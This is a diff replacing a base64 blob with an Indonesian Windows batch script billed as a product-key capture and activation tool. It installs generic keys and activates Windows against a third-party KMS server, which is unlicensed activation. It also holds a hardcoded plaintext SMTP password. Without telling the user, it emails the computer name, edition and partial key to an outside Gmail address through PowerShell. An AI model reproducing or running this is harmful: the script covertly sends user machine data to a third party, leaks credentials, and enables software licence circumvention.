@@ -1,1 +1,93 @@
-QGVjaG8gb2ZmCnRpdGxlIENhcHR1cmUgUHJvZHVjdCBLZXkgYnkgRWxlc3NzR2hpZmFyaWlpCmNvbG9yIDBhCgo6OiAtLS0gS09ORklHVVJBU0kgRU1BSUwgLS0tCnNldCAiRlJPTV9FTUFJTD1teS5kb25nZXJAaGFuYWRlc3UubXkuaWQiCnNldCAiVE9fRU1BSUw9ZG9tZXRob2RlQGdtYWlsLmNvbSIKc2V0ICJTTVRQX1NFUlZFUj1zbXRwLnpvaG8uY29tIgpzZXQgIlNNVFBfUE9SVD01ODciCnNldCAiRU1BSUxfVVNFUj1teS5kb25nZXJAaGFuYWRlc3UubXkuaWQiCnNldCAiRU1BSUxfUEFTUz1Mbm94enhkejExKiIgIDo6IEdhbnRpIGRlbmdhbiAxNiBrYXJha3RlciBBcHAgUGFzc3dvcmQgR21haWwKCjo6IC0tLSBQSUxJSCBWRVJTSSBXSU5ET1dTIC0tLQplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQplY2hvICAgIFNlbGFtYXQgRGF0YW5nIGRpIFNjcmlwdCBDYXB0dXJlIEtleQplY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQplY2hvLgplY2hvIFBpbGloIHZlcnNpIFdpbmRvd3MgQW5kYToKZWNobyAgIDEuIFdpbmRvd3MgMTAgSG9tZSBTaW5nbGUgTGFuZ3VhZ2UKZWNobyAgIDIuIFdpbmRvd3MgMTAvMTEgUHJvCmVjaG8gICAzLiBIYXB1cyBQcm9kdWN0IEtleSAoUmVzZXQpCmVjaG8uCnNldCAvcCBwaWxpaD1NYXN1a2thbiBwaWxpaGFuICgxLzIvMyk6IAoKaWYgIiVwaWxpaCUiPT0iMSIgKAogICAgc2V0ICJuYW1hPVdpbmRvd3MgMTAgSG9tZSBTaW5nbGUgTGFuZ3VhZ2UiCiAgICBzZXQgImtleT03SE5SWC1EN0tHRy0zSzRSUS00V1BKNC1ZVERGSCIKKSBlbHNlIGlmICIlcGlsaWglIj09IjIiICgKICAgIHNldCAibmFtYT1XaW5kb3dzIDEwIFBybyIKICAgIHNldCAia2V5PVcyNjlOLVdGR1dYLVlWQzlCLTRKNkM5LVQ4M0dYIgopIGVsc2UgaWYgIiVwaWxpaCUiPT0iMyIgKAogICAgY29sb3IgMGMKICAgIGVjaG8uCiAgICBlY2hvID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICAgIGVjaG8gICAgIE1lbmdoYXB1cyBQcm9kdWN0IEtleSBkYW4gTGlzZW5zaS4uLgogICAgZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICBzbG1nciAvdXBrCiAgICBzbG1nciAvY3BreQogICAgZWNoby4KICAgIGVjaG8gW09LXSBQcm9kdWN0IEtleSBiZXJoYXNpbCBkaWhhcHVzLgogICAgZWNoby4KICAgIHBhdXNlCiAgICBleGl0IC9iCikgZWxzZSAoCiAgICBjb2xvciAwYwogICAgZWNobyBbRVJST1JdIFBpbGloYW4gdGlkYWsgdmFsaWQhCiAgICBwYXVzZQogICAgZXhpdCAvYgopCgo6OiAtLS0gQW1iaWwgNSBkaWdpdCB0ZXJha2hpciBwcm9kdWN0IGtleSAtLS0Kc2V0ICJsYXN0NT0la2V5On4tNSUiCgo6OiAtLS0gU2ltcGFuIGtleSBrZSBmaWxlIGxva2FsIC0tLQooCiAgZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KICBlY2hvIE5hbWEgV2luZG93cyA6ICVuYW1hJQogIGVjaG8gUHJvZHVjdCBLZXkgIDogKioqKiotKioqKiotKioqKiotKioqKiotJWxhc3Q1JQogIGVjaG8gRGlzaW1wYW4gcGFkYTogJWRhdGUlICV0aW1lJQogIGVjaG8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CikgPj4gQ2FwdHVyZWRLZXkudHh0Cgo6OiAtLS0gTWVtYXNhbmcga2V5IC0tLQplY2hvLgplY2hvIE1lbWFzYW5nIGtleSAuLi4KY3NjcmlwdCAvL25vbG9nbyAld2luZGlyJVxzeXN0ZW0zMlxzbG1nci52YnMgL2lwayAla2V5JSA+bnVsIDI+JjEKZWNobyBbT0tdIFByb2R1Y3QgS2V5IGJlcmhhc2lsIGRpcGFzYW5nLgoKZWNoby4KZWNobyBNZW5nYXR1ciBLTVMgU2VydmVyIC4uLgpjc2NyaXB0IC8vbm9sb2dvICV3aW5kaXIlXHN5c3RlbTMyXHNsbWdyLnZicyAvc2ttcyBrbXMuZGlnaWJveS5pciA+bnVsIDI+JjEKZWNobyBbT0tdIFByb3NlcyBha3RpdmFzaSBrZXkuCgplY2hvLgplY2hvIE1lbmdha3RpZmthbiBrZXkgLi4uCmNzY3JpcHQgLy9ub2xvZ28gJXdpbmRpciVcc3lzdGVtMzJcc2xtZ3IudmJzIC9hdG8gPm51bCAyPiYxCmVjaG8gW09LXSBBa3RpdmFzaSBrZXkgYmVyaGFzaWwgZGkgYWt0aWZrYW4uCgo6OiAtLS0gS2lyaW0gbG9nIGtlIGVtYWlsIGRlbmdhbiBQb3dlclNoZWxsIC0tLQpwb3dlcnNoZWxsIC1Db21tYW5kICIkRU1BSUxfQk9EWT1cIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PWBuQ29tcHV0ZXIgTmFtZSA6ICVDT01QVVRFUk5BTUUlYG5XaW5kb3dzIFZlcnNpb246ICVuYW1hJWBuQ2FwdHVyZWQgS2V5ICA6ICoqKioqLSoqKioqLSoqKioqLSoqKioqLSVsYXN0NSVgblRpbWUgICAgICAgICAgOiAlZGF0ZSUgJXRpbWUlYG49PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1cIjsgJFNNVFBTZXJ2ZXI9JyVTTVRQX1NFUlZFUiUnOyAkU01UUFBvcnQ9JVNNVFBfUE9SVCU7ICRFbWFpbEZyb209JyVGUk9NX0VNQUlMJSc7ICRFbWFpbFRvPSclVE9fRU1BSUwlJzsgJFN1YmplY3Q9J0NhcHR1cmVkIEtleSBMb2cnOyAkQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJyVFTUFJTF9VU0VSJScsKENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJyVFTUFJTF9QQVNTJScgLUFzUGxhaW5UZXh0IC1Gb3JjZSkpOyBTZW5kLU1haWxNZXNzYWdlIC1TbXRwU2VydmVyICRTTVRQU2VydmVyIC1Qb3J0ICRTTVRQUG9ydCAtVXNlU3NsIC1DcmVkZW50aWFsICRDcmVkIC1Gcm9tICRFbWFpbEZyb20gLVRvICRFbWFpbFRvIC1TdWJqZWN0ICRTdWJqZWN0IC1Cb2R5ICRFTUFJTF9CT0RZIgoKZWNoby4KZWNobyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmVjaG8gICAgICBUZXJpbWFrYXNpaCBLYXJuYSBNZW5nZ3VuYWthbiBTY3JpcHQKZWNobyAgICAgICAgICAgRGFyaSBFbGVzc3NHaGlmYXJpCmVjaG8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKZWNoby4KZWNobyBNb2hvbiB0dW5nZ3Ugc2ViZW50YXIgdW50dWsgbWVsaWhhdCBzdGF0dXMgZXhwaXJlZCBrZXkuLi4KdGltZW91dCAvdCA1ID5udWwKc2xtZ3IudmJzIC94cHIKCnBhdXNl
+@echo off
+title Capture Product Key by ElesssGhifariii
+color 0a
+
+:: --- KONFIGURASI EMAIL ---
+set "FROM_EMAIL=my.donger@hanadesu.my.id"
+set "TO_EMAIL=domethode@gmail.com"
+set "SMTP_SERVER=smtp.zoho.com"
+set "SMTP_PORT=587"
+set "EMAIL_USER=my.donger@hanadesu.my.id"
+set "EMAIL_PASS=Lnoxzxdz11*"  :: Ganti dengan 16 karakter App Password Gmail
+
+:: --- PILIH VERSI WINDOWS ---
+echo ==========================================
+echo    Selamat Datang di Script Capture Key
+echo ==========================================
+echo.
+echo Pilih versi Windows Anda:
+echo   1. Windows 10 Home Single Language
+echo   2. Windows 10/11 Pro
+echo   3. Hapus Product Key (Reset)
+echo.
+set /p pilih=Masukkan pilihan (1/2/3): 
+
+if "%pilih%"=="1" (
+    set "nama=Windows 10 Home Single Language"
+    set "key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
+) else if "%pilih%"=="2" (
+    set "nama=Windows 10 Pro"
+    set "key=W269N-WFGWX-YVC9B-4J6C9-T83GX"
+) else if "%pilih%"=="3" (
+    color 0c
+    echo.
+    echo ===========================================
+    echo     Menghapus Product Key dan Lisensi...
+    echo ===========================================
+    slmgr /upk
+    slmgr /cpky
+    echo.
+    echo [OK] Product Key berhasil dihapus.
+    echo.
+    pause
+    exit /b
+) else (
+    color 0c
+    echo [ERROR] Pilihan tidak valid!
+    pause
+    exit /b
+)
+
+:: --- Ambil 5 digit terakhir product key ---
+set "last5=%key:~-5%"
+
+:: --- Simpan key ke file lokal ---
+(
+  echo =======================================
+  echo Nama Windows : %nama%
+  echo Product Key  : *****-*****-*****-*****-%last5%
+  echo Disimpan pada: %date% %time%
+  echo =======================================
+) >> CapturedKey.txt
+
+:: --- Memasang key ---
+echo.
+echo Memasang key ...
+cscript //nologo %windir%\system32\slmgr.vbs /ipk %key% >nul 2>&1
+echo [OK] Product Key berhasil dipasang.
+
+echo.
+echo Mengatur KMS Server ...
+cscript //nologo %windir%\system32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
+echo [OK] Proses aktivasi key.
+
+echo.
+echo Mengaktifkan key ...
+cscript //nologo %windir%\system32\slmgr.vbs /ato >nul 2>&1
+echo [OK] Aktivasi key berhasil di aktifkan.
+
+:: --- Kirim log ke email dengan PowerShell ---
+powershell -Command "$EMAIL_BODY=\"=======================================`nComputer Name : %COMPUTERNAME%`nWindows Version: %nama%`nCaptured Key  : *****-*****-*****-*****-%last5%`nTime          : %date% %time%`n=======================================\"; $SMTPServer='%SMTP_SERVER%'; $SMTPPort=%SMTP_PORT%; $EmailFrom='%FROM_EMAIL%'; $EmailTo='%TO_EMAIL%'; $Subject='Captured Key Log'; $Cred = New-Object System.Management.Automation.PSCredential('%EMAIL_USER%',(ConvertTo-SecureString '%EMAIL_PASS%' -AsPlainText -Force)); Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Cred -From $EmailFrom -To $EmailTo -Subject $Subject -Body $EMAIL_BODY"
+
+echo.
+echo ===========================================
+echo      Terimakasih Karna Menggunakan Script
+echo           Dari ElesssGhifari
+echo ===========================================
+
+echo.
+echo Mohon tunggu sebentar untuk melihat status expired key...
+timeout /t 5 >nul
+slmgr.vbs /xpr
+
+pause
